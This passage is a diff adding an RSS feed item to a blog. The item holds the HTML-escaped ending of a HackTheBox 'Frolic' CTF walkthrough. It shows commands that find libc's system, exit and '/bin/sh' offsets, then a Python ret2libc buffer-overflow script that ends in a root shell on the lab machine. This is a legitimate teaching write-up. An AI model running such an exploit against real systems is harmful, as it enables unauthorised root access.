+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Same thing for exit function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now the last thing we need is to find “/bin/sh” string, we do.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code10.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sweet, we got everything we need. Let’s chain all together with some python code.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb7e19000&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0003ada0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0002e9d0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;base_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0015ba0b&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_base_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_base_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So running this:&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code11.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;we get our root shell!&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code12.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
+
+&lt;p&gt;by me&lt;/p&gt;
+</description>
+        <pubDate>Sat, 23 Mar 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/Frolic-hackthebox-walkthrough/</link>
+        <guid isPermaLink="true">http://localhost:4000/Frolic-hackthebox-walkthrough/</guid>
+        
+        <category>CTF</category>
         
         <category>|</category>
         
